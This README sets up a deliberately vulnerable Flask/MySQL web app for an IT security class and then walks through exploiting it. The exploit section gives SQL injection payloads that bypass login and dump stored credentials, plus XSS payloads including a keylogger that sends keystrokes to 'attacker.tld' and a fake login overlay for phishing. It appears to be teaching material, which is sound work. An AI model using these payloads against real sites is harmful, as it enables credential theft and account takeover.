
# Setting up the Web App for the IT security session

## Installing prerequisites
Assuming you have a Debian-based system, you can install the required packages by running the following command:

1. installing pip3 and venv
```bash
sudo apt update && sudo apt install python3-pip python3-venv
```
2. Install flask and cors
```bash
pip3 install flask flask-cors
```
3. Install Pymysql
```bash
pip3 install pymysql
```
4. Install nginx
```bash
sudo apt install nginx
```



## Database Configuration

### Install and Configure MySQL

1. Install MySQL server:

```bash
sudo apt update && sudo apt install mysql-server
```
2. Configure MySQL:

```bash
sudo mysql_secure_installation
```
3. Log in to MySQL:

```bash
sudo mysql
```
4. Create a new database:
   replace `mydb` with the name of your database and `admin` with the name of your user and `password` with the password of your user.
```sql
CREATE DATABASE mydb;
USE mydb;
CREATE USER 'admin'@'localhost' IDENTIFIED BY 'password';
CREATE TABLE credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL
);
INSERT INTO credentials (user, password) VALUES ('testuser', 'testpassword');

GRANT ALL PRIVILEGES ON mydb.* TO 'admin'@'localhost';
FLUSH PRIVILEGES;
```
5. Exit MySQL:

```sql
exit;
```

6. set the password as an environment variable, so in the app.py file, you can access it.
```bash
export MYDB_PASS=password
```
## Configuring the Nginx server

1. Create a new configuration file for the web app:
```bash
sudo nano /etc/nginx/sites-available/myflaskapp
```

2. Add the following configuration to the file:
```nginx
server {
    listen 80;
    server_name _;  # wildcard

    location / {
        proxy_pass http://127.0.0.1:5000;  # Point to where Flask is running
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```
3. Create a symbolic link to the sites-enabled directory:
```bash
sudo ln -s /etc/nginx/sites-available/myflaskapp /etc/nginx/sites-enabled
```
4. Restart the Nginx server:
```bash
sudo systemctl restart nginx
```
5. Check the status of the Nginx server:
```bash
sudo systemctl status nginx
```

## Setting up the Web App

1. Clone the repository from GitHub
2. Navigate to the directory where the repository was cloned and app.py is located
3. Run the following command to start the web app:
```bash
python3 app.py
```
4. Then you should see the following output:
```
❯ python3 app.py
 * Serving Flask app 'app'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
```
5. Open a web browser and navigate to `http://127.0.0.1:5000` to view the web app.

You should see this like the screenshots below:

![Login Page](Documentation/Screenshot%20from%202024-04-29%2022-21-07.png)
![Register Page](Documentation/Screenshot%20from%202024-04-29%2022-21-55.png)


## Exploiting the Web App

### SQL Injection

1. To login as an admin without knowing the password, enter the following payload in the username field and enter ```attack``` in the password field:
``` sql
' union select 1,'admin','attack'; -- '
```


3. To retrieve all the usernames and passwords from the database, enter the following payload in the username field, again enter ```attack``` in the password field:
``` sql
' union select 1, group_concat(concat_ws('|', user, password) separator ', '), 'attack' from credentials -- '
```

### Cross-Site Scripting (XSS)

1. Simple alert box:
``` html
<img src="" onerror=alert('test')>

<iframe src="javascript:alert('test');"></iframe>

<div onmouseover="alert('test')">Hover over me</div>

<a href="#" onclick="alert('test')">Click here</a>
```

2. Keylogger:
``` html
<img src="" onerror="document.addEventListener('keypress', function(e) { fetch('http://attacker.tld?key=' + String.fromCharCode(e.which)); }); this.remove();">
```

3. Fake Website
``` html
<img src="" onerror="(function(){
  document.body.innerHTML = `
    <div style='position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center;'>
      <div style='background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center;'>
        <h2 style='color: #1877f2; font-family: Helvetica, Arial, sans-serif; margin-bottom: 20px;'>Website</h2>
        <form>
          <input type='text' placeholder='Email or Phone Number' style='width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
          <input type='password' placeholder='Password' style='width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
          <button type='submit' style='width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;'>Log In</button>
        </form>
        <div style='margin-top: 10px;'>
          <a href='#' style='color: #1877f2; font-size: 14px; text-decoration: none;'>Forgotten password?</a>
        </div>
      </div>
    </div>
  `;
}())">
```